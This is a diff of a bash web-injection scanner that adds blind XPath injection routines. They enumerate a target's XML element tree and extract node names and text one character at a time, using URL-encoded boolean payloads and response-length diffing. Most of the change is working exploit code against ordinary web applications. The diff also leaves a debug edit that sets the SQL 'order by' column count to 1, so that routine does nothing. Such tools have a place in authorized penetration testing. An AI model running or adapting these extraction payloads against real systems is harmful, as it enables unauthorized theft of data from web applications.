@@ -252,7 +252,8 @@ echo "Order by 1 got a $status1 response, order by 9659 got a $status999 respons
 orderbyrequest()
 {
 count=1
-columns=150
+columns=1
+#change this back to 150!!!
 while [[ $count -lt $columns ]] ; do
 		if [ true = "$O" ] ; then #uri unicode encoding
 			uriinputencode="1$quote order by $count$end"
@@ -282,7 +283,7 @@ orderbyrequestlength()
 {
 echo "Using 'order by x' and response length diffing to determine the number of columns"
 count=1
-columns=150
+columns=1
 while [[ $count -lt $columns ]] ; do
 	echo -n "."
 	if [ true = "$Z" ] ; then echo "DEBUG! sending order by req: $badparams" ; fi
@@ -1108,23 +1109,234 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	remessage="STATUS DIFF T:$status_true F:$status_false XPATH Injection"
 	echoreporter
 	xp="string"
-	xpathtests
+	xpathnodenumberextract
+	xpathdataextraction
+	xpathnodenameextract
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
 		remessage="LENGTH DIFF EQUALS $lendiff XPATH Injection"
 		echoreporter
 		xp="string"
-		xpathtests
+		xpathnodenumberextract
+		xpathdataextraction
+		xpathnodenameextract
+		
 	fi
 fi
 #end of dbms enumeraton if statement
 }
 
-xpathtests()
+xpathnodenumberextract()
+{
+rm ./listofxpathelements.txt 2>/dev/null
+echo "Attempting to extract element hierachy using xpath injection."
+#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
+
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+max_nodenumber=10
+obuff="%2f%2a%5b%31%5d"
+ecount=1
+fcount=0
+while [[ $ecount -lt $max_nodenumber ]] ; do
+	#' or count(/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1]/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1]/*[1]/*[1])=1 or 'a'='b
+	#' or count($obuff)=1 or 'a'='b
+	#%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d%31%20%6f%72%20%27%61%27%3d%27%62
+
+	badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d1%20%6f%72%20%27%61%27%3d%27%62"`
+	requester
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+	#echo "...73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		#echo -n "$ecount"
+		obuff=$obuff"%2f%2a%5b%31%5d"
+		((fcount=$fcount+1))
+	fi
+	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+		if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+			#echo -n "$ecount"
+			obuff=$obuff"%2f%2a%5b%31%5d"
+		        ((fcount=$fcount+1))
+		fi
+	fi
+	((ecount=$ecount+1))
+done
+echo ""
+echo "Total element depth: $fcount"
+#cat ./listofxpathnodes.txt
+
+xcount=1
+ecount=1
+maxxcount=10
+vbuff="%2f%2a%5b$xcount%5d"
+rbuff="/*[$xcount]"
+obuff=""
+mbuff=""	
+while [[ $ecount -le $fcount ]] ; do
+	#' or count(/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1]/*[1])=1 or 'a'='b
+	#' or count(/*[1]/*[1]/*[1]/*[1])=1 or 'a'='b
+	#' or count($obuff)=1 or 'a'='b
+	#%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d%31%20%6f%72%20%27%61%27%3d%27%62
+	xcount=1
+	while [[ $xcount -le $maxxcount ]] ; do
+		vbuff="%2f%2a%5b$xcount%5d"
+		xbuff="$obuff""$vbuff"
+
+		rbuff="/*[$xcount]"
+		ybuff="$mbuff""$rbuff"
+
+		badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1%20%6f%72%20%27%61%27%3d%27%62"`
+		requester
+		status_true=`echo $response | cut -d ":" -f 1`
+		length_true=`echo $response | cut -d ":" -f 2`
+
+		((lendiff=$length_true-$length_false))
+		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+			echo "$ybuff" >> ./listofxpathelements.txt
+			echo "$ybuff" 
+			#xpathdataextraction
+		fi
+		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+				echo "$ybuff" >> ./listofxpathelements.txt				
+				echo "$ybuff"
+				#xpathdataextraction
+			fi
+		fi
+		((xcount=$xcount+1))
+	done
+	((ecount=$ecount+1))
+	obuff="%2f%2a%5b%31%5d"$obuff
+	mbuff="/*[1]"$mbuff
+done
+#echo ""
+
+#cat ./listofxpathelements.txt 2>/dev/null
+}
+
+xpathdatachecklength()
+{
+rm ./listofextractablexpathelements.txt 2>/dev/null
+cat ./listofxpathelements.txt 2>/dev/null | while read entry ; do
+	i=0
+	input=$entry
+	outbuf=''
+	stringlength=${#input}
+	((stringlengthminus1=$stringlength-1))
+	while ((i<$stringlength)) ; do 
+		char=`echo "${input:i:1}"`
+		outbuf=$outbuf`echo -n "%"`
+		outbuf=$outbuf`printf "%02x" "'$char'"`
+		((i++))
+	done 
+	#						     #' or string-length($entry/text())>1 or 'a'='b
+	badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$outbuf%2f%74%65%78%74%28%29%29%3e%31%20%6f%72%20%27%61%27%3d%27%62"`
+	requester
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+	#echo "status_true: $status_true length_true: $length_true"
+	#echo "status_false: $status_false length_false: $length_false"
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		echo "$entry" >> ./listofextractablexpathelements.txt
+	fi
+	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+		if [[ $lendiff -gt 3 || $lendiff -lt -3 ]] ; then			
+			echo "$entry" >> ./listofextractablexpathelements.txt
+		fi
+	fi
+done
+#echo "list:"
+#cat ./listofextractablexpathelements.txt
+}
+
+xpathdataextraction()
+{
+echo "Commencing data extraction. You may see empty lines; please be patient."
+
+#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
+
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+
+
+ebuf=''
+jflag=1
+max_textlength=10
+cat ./listofxpathelements.txt 2>/dev/null | while read ybuff ; do
+	weflag=0
+	#echo "$ybuff "
+	i=0
+	input=$ybuff
+	outbuf=''
+	stringlength=${#input}
+	((stringlengthminus1=$stringlength-1))
+	while ((i<$stringlength)) ; do 
+		char=`echo "${input:i:1}"`
+		outbuf=$outbuf`echo -n "%"`
+		outbuf=$outbuf`printf "%02x" "'$char'"`
+		((i++))
+	done 
+	#echo "$outbuf"
+	#echo "ybuff $ybuff"
+	jflag=1
+	while [[ $jflag -le $max_textlength ]] ; do
+		for ipo in `cat ./payloads/alphabet.txt` ; do
+			#echo "ipo: $ipo ybuff: $ybuff jflag: $jflag"        #'+or+substring(/*[1]/*[1]/*[1]/*[2]/text(),1,1)='1'+or+'a'='b&submit=Inject!
+			#always true:                                       #' or substring($ybuff/text(),$jflag,1)='$ipo' or 'a'='b          
+			#echo -n "."			
+			badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$outbuf%2f%74%65%78%74%28%29%2c$jflag%2c%31%29%3d%27$ipo%27%20%6f%72%20%27%61%27%3d%27%62"`
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`
+			#echo "status_true: $status_true length_true: $length_true"
+			#echo "status_false: $status_false length_false: $length_false"
+			((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $weflag == "0" ]] ; then 
+					echo -n "$ybuff "
+					weflag=1
+				fi
+				echo -n "$ipo"
+				ebuf=$ebuf$ipo
+			fi
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 3 || $lendiff -lt -3 ]] ; then
+					if [[ $weflag == "0" ]] ; then 
+						echo -n "$ybuff "
+						weflag=1
+					fi
+					echo -n "$ipo"
+					ebuf=$ebuf$ipo
+				fi
+			fi
+		done
+	#echo "$ebuf" 
+	((jflag=$jflag+1))
+	#echo "$jflag"
+	done
+echo ""
+echo $ybuff$ebuf >> ./listofxpathdata.txt
+done	
+}
+
+
+xpathnodenameextract()
 {
 rm ./listofxpathnodes.txt 2>/dev/null
-
+echo "Attempting to extract node names using xpath injection."
 #always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
 badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
 
@@ -1142,7 +1354,7 @@ for nodename in `cat ./payloads/nodenames.txt` ; do
 	fi		
 	while [[ $position -lt $max_position ]] ; do
 		#echo -n "Node: $nodename Position: $position Node name: "
-		echo ""
+		#echo ""
 		cflag=1
 		abuf=''
 		while [[ $cflag -lt $max_name_length ]] ; do
@@ -1171,11 +1383,11 @@ for nodename in `cat ./payloads/nodenames.txt` ; do
 	echoreporter
 	iu=''
 	if [[ "$nodename" == "child" ]] ; then
-		iu="--"
+		iu=".child node: ---"
 	elif [[ "$nodename" == "self" ]] ; then
-		iu="-"
+		iu="..self node: --"
 	elif [[ "$nodename" == "parent" ]] ; then
-		iu=""
+		iu="parent node: -"
 	fi
 
 	echo $iu$abuf >> ./listofxpathnodes.txt
@@ -1183,7 +1395,9 @@ for nodename in `cat ./payloads/nodenames.txt` ; do
 	done
 done
 
-cat ./listofxpathnodes.txt
+cat ./listofxpathnodes.txt 2>/dev/null
+cat ./listofxpathelements.txt 2>/dev/null
+#cat ./listofxpathdata.txt 2>/dev/null
 }
 	
 lettergrab()
